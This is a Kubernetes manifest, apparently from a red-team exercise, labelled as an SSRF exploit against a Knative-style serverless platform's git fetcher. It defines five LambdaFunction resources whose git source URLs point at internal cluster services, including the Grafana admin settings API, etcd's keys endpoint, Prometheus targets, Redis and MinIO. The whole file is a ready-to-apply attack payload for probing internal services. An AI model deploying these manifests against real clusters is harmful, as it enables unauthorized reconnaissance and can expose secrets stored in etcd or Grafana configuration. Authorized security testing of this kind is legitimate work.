# BLUE-001: SSRF via Go-Git - Internal Service Scan
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit scans internal cluster services using SSRF.
# Multiple LambdaFunctions probe different internal endpoints.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-internal-prometheus
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "prometheus"
spec:
  source:
    type: git
    git:
      # SSRF to Prometheus metrics
      url: "http://prometheus-server.monitoring.svc:9090/api/v1/targets"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-internal-grafana
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "grafana"
spec:
  source:
    type: git
    git:
      # SSRF to Grafana API
      url: "http://grafana.monitoring.svc:3000/api/admin/settings"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-internal-etcd
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "etcd"
spec:
  source:
    type: git
    git:
      # SSRF to etcd (if exposed)
      url: "http://etcd.kube-system.svc:2379/v2/keys/"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-internal-redis
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "redis"
spec:
  source:
    type: git
    git:
      # SSRF to Redis (HTTP-like)
      url: "http://redis.default.svc:6379/"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: blue-001-internal-minio
  labels:
    redteam: "true"
    exploit: "blue-001"
    target: "minio"
spec:
  source:
    type: git
    git:
      # SSRF to MinIO
      url: "http://minio.minio.svc:9000/minio/health/live"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
